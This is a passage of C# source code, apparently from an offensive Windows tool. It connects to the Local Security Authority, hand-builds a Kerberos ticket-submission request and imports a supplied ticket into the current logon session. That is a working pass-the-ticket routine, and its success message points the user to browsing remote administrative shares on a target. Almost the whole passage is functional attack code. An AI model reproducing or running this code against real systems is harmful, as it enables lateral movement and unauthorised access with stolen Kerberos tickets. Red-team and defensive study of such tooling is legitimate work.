                    Console.WriteLine($"[!] LsaConnectUntrusted failed: 0x{ntstatus:X8}");
                    return false;
                }

                Console.WriteLine("[+] Connected to LSA");

                // Lookup Kerberos package
                string packageName = "Kerberos";
                IntPtr packageNamePtr = Marshal.StringToHGlobalAnsi(packageName);
                LSA_STRING lsaPackageName = new LSA_STRING
                {
                    Length = (ushort)packageName.Length,
                    MaximumLength = (ushort)(packageName.Length + 1),
                    Buffer = packageNamePtr
                };

                int authPackage;
                ntstatus = LsaLookupAuthenticationPackage(lsaHandle, ref lsaPackageName, out authPackage);
                Marshal.FreeHGlobal(packageNamePtr);

                if (ntstatus != 0)
                {
                    Console.WriteLine($"[!] LsaLookupAuthenticationPackage failed: 0x{ntstatus:X8}");
                    return false;
                }

                Console.WriteLine($"[+] Kerberos package ID: {authPackage}");

                // Build KERB_SUBMIT_TKT_REQUEST
                // Structure:
                // - MessageType (DWORD) = KerbSubmitTicketMessage (21)
                // - LogonId (LUID) = 0 (current session)
                // - Flags (DWORD) = 0
                // - Key (KERB_CRYPTO_KEY) = empty (3 DWORDs)
                // - KerbCredSize (DWORD)
                // - KerbCredOffset (DWORD)
                // - [KRB-CRED data]

                int baseSize = 4 + 8 + 4 + 12 + 4 + 4; // = 36 bytes
                int totalSize = baseSize + ticketBytes.Length;

                IntPtr submitBuffer = Marshal.AllocHGlobal(totalSize);

                try
                {
                    // Zero out buffer
                    for (int i = 0; i < totalSize; i++)
                        Marshal.WriteByte(submitBuffer, i, 0);

                    int offset = 0;

                    // MessageType = KerbSubmitTicketMessage (21)
                    Marshal.WriteInt32(submitBuffer, offset, KerbSubmitTicketMessage);
                    offset += 4;

                    // LogonId (LUID) = 0 for current session
                    Marshal.WriteInt64(submitBuffer, offset, 0);
                    offset += 8;

                    // Flags = 0
                    Marshal.WriteInt32(submitBuffer, offset, 0);
                    offset += 4;

                    // Key.KeyType = 0
                    Marshal.WriteInt32(submitBuffer, offset, 0);
                    offset += 4;
                    // Key.Length = 0
                    Marshal.WriteInt32(submitBuffer, offset, 0);
                    offset += 4;
                    // Key.Value = 0
                    Marshal.WriteInt32(submitBuffer, offset, 0);
                    offset += 4;

                    // KerbCredSize
                    Marshal.WriteInt32(submitBuffer, offset, ticketBytes.Length);
                    offset += 4;

                    // KerbCredOffset
                    Marshal.WriteInt32(submitBuffer, offset, baseSize);
                    offset += 4;

                    // Copy ticket data
                    Marshal.Copy(ticketBytes, 0, IntPtr.Add(submitBuffer, baseSize), ticketBytes.Length);

                    // Submit ticket
                    IntPtr returnBuffer;
                    int returnLength;
                    int protocolStatus;

                    ntstatus = LsaCallAuthenticationPackage(
                        lsaHandle,
                        authPackage,
                        submitBuffer,
                        totalSize,
                        out returnBuffer,
                        out returnLength,
                        out protocolStatus);

                    if (ntstatus != 0)
                    {
                        Console.WriteLine($"[!] LsaCallAuthenticationPackage failed: 0x{ntstatus:X8}");
                        return false;
                    }

                    if (protocolStatus != 0)
                    {
                        Console.WriteLine($"[!] Protocol status error: 0x{protocolStatus:X8}");

                        // Common error codes
                        if (protocolStatus == unchecked((int)0xC000006D))
                            Console.WriteLine("[!] This likely means: Wrong password or expired ticket");
                        else if (protocolStatus == unchecked((int)0xC0000022))
                            Console.WriteLine("[!] Access denied - may need admin privileges");

                        return false;
                    }

                    if (returnBuffer != IntPtr.Zero)
                        LsaFreeReturnBuffer(returnBuffer);

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n[+] SUCCESS! Ticket imported to current session");
                    Console.ResetColor();
                    Console.WriteLine("\n[*] You can now access resources with this ticket:");
                    Console.WriteLine("    klist          - View imported tickets");
                    Console.WriteLine("    dir \\\\target\\C$  - Access remote shares");

                    return true;
                }
                finally
                {
                    Marshal.FreeHGlobal(submitBuffer);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error importing ticket: {ex.Message}");
                OutputHelper.Verbose($"[!] Stack: {ex.StackTrace}");
                return false;
            }
            finally
            {
                if (lsaHandle != IntPtr.Zero)
                    LsaDeregisterLogonProcess(lsaHandle);
            }
        }
    }
}
